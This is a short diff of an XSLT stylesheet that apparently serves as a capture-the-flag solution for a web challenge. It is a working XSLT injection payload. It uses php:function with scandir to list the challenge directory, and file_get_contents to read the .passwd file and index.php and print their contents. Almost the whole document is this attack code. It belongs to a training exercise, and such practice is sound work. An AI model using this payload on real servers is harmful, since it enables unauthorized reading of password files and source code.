@@ -11,17 +11,10 @@ extension-element-prefixes="user111"
 function test6(){return "hello world!";}
 ]]></xsl:text>
 </msxsl:script>
-<xsl:variable name="inline-array">
-        <Item>A</Item>
-        <Item>B</Item>
-        <Item>C</Item>
-    </xsl:variable>
-    <xsl:param name="array" select="document('')/*/xsl:variable[@name='inline-array']/*"/> 
-<xsl:template match="/">	
 <xsl:param  name="shandle"    select="php:function('scandir','/challenge/web-serveur/ch50')" disable-output-escaping="yes"/>
 <xsl:param  name="strscand"   select="php:function('file_get_contents','/challenge/web-serveur/ch50/.passwd')" disable-output-escaping="yes"/> 
 <xsl:param  name="header"     select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')" disable-output-escaping="yes"/>
- TEST ARRAY <xsl:value-of select="$array[2]"/>
+<xsl:template match="/">	
  PHPINFO:<xsl:value-of select="$strscand"/>     
   SCANDIR0:<xsl:value-of select="$shandle[2]"/>
  DIR1 index.php:<xsl:value-of select="$header"/>   
